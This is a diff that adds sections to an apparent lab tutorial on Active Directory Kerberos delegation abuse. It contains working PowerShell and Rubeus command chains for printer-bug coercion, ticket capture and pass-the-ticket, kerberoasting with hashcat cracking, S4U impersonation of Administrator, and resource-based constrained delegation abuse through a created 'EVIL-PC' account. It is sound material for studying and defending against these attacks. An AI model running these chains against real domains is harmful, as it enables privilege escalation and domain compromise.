@@ -46,5 +46,119 @@ Get-ADComputer -Identity "UNCON-PC" -Properties TrustedForDelegation, userAccoun
 <img width="642" height="215" alt="image" src="https://github.com/user-attachments/assets/fff47efd-260f-4739-b802-b2551249bbbe" />
 
 ---
+```powershell
+Import-Module PowerView.ps1
 
-### 2.3 
+
+
+.\Rubeus.exe monitor /interval:5 /filteruser:DOMAIN_ADMIN_NAME
+
+.\SpoolSample.exe DC01 UNCON-PC
+
+.\Rubeus.exe ptt /ticket:base64_ticket_burada
+```
+
+---
+### 2.3 Constrained Delegation with Protocol Transition (S4U2Self + S4U2Proxy)
+```powershell
+Import-Module ActiveDirectory
+
+# Create Service Account
+New-ADUser -Name "unconstrained-svc" -SAMAccountName "unconstrained-svc" `
+    -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
+    -Enabled $true -PasswordNeverExpires $true
+
+# Set SPN
+setspn -A HTTP/unconstrained-svc.lab.local unconstrained-svc
+
+# Enable Constrained Delegation + Protocol Transition
+Set-ADAccountControl -Identity "unconstrained-svc" -TrustedToAuthForDelegation $true
+Set-ADUser -Identity "unconstrained-svc" -Add @{
+    'msDS-AllowedToDelegateTo' = @("CIFS/DC01.lab.local","HTTP/DC01.lab.local")
+}
+
+# Check
+Get-ADUser -Identity "unconstrained-svc" -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo, ServicePrincipalName
+```
+
+```powershell
+Import-Module PowerView.ps1
+
+# Find SPN-enabled accounts with PowerView
+Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
+
+# Direct kerberoast with Rubeus
+.\Rubeus.exe kerberoast /user:unconstrained-svc /outfile:hashes.txt
+
+# Crack Hash
+hashcat -m 13100 hashes.txt rockyou.txt
+
+# The complete chain with Rubeus
+.\Rubeus.exe s4u /user:unconstrained-svc /rc4:NTLM_HASH_BURADA `
+    /impersonateuser:Administrator `
+    /msdsspn:CIFS/DC01.lab.local `
+    /ptt
+
+# If the password is known, calculate the NTLM hash (e.g., with Python/CME) or provide the password directly to Rubeus.
+.\Rubeus.exe s4u /user:unconstrained-svc /password:TAPILAN_PAROL `
+    /impersonateuser:Administrator `
+    /msdsspn:CIFS/DC01.lab.local `
+    /ptt
+```
+
+### 2.4 Constrained Delegation without Protocol Transition ( Use Kerberos only )
+```powershell
+Import-Module ActiveDirectory
+
+# Create Service Account
+New-ADUser -Name "constrained-svc" -SAMAccountName "constrained-svc" `
+    -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
+    -Enabled $true -PasswordNeverExpires $true
+
+# set SPN
+setspn -A HTTP/constrained-svc.lab.local constrained-svc
+
+# Constrained delegation, BUT WITHOUT PROTOCOL TRANSITION
+# (TrustedToAuthForDelegation is not set - default remains False)
+Set-ADUser -Identity "constrained-svc" -Add @{
+    'msDS-AllowedToDelegateTo' = @("CIFS/DC01.lab.local","HTTP/DC01.lab.local")
+}
+
+# Check - TrustedToAuthForDelegation must be False
+Get-ADUser -Identity "constrained-svc" -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo, ServicePrincipalName
+```
+
+### 2.5 Resource-Based Constrained Delegation (RBCD)
+```powershell
+Import-Module ActiveDirectory
+
+# Create target computer account - NO delegation is enabled (default)
+New-ADComputer -Name "RBCD-PC" -SAMAccountName "RBCD-PC" -Enabled $true
+
+# Check - TrustedForDelegation False, msDS-AllowedToActOnBehalfOfOtherIdentity empty
+Get-ADComputer -Identity "RBCD-PC" -Properties TrustedForDelegation, msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+```powershell
+# With PowerView (in a lowpriv-user context)
+New-MachineAccount -MachineAccount “EVIL-PC” -Password (ConvertTo-SecureString “Ev1lP@ss123!” -AsPlainText -Force)
+
+$evilSID = Get-DomainComputer -Identity “EVIL-PC” -Properties objectsid | Select -Expand objectsid
+
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor “O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$evilSID)”
+$SDbytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDbytes, 0)
+
+Set-ADComputer -Identity “RBCD-PC” -PrincipalsAllowedToDelegateToAccount “EVIL-PC$”
+
+# Check
+Get-ADComputer -Identity “RBCD-PC” -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+
+# Full chain with Rubeus
+.\Rubeus.exe s4u /user:EVIL-PC$ /password:Ev1lP@ss123! `
+    /impersonateuser:Administrator `
+    /msdsspn:CIFS/RBCD-PC.lab.local `
+    /domain:lab.local `
+    /ptt
+
+ls \\RBCD-PC.lab.local\C$
+```
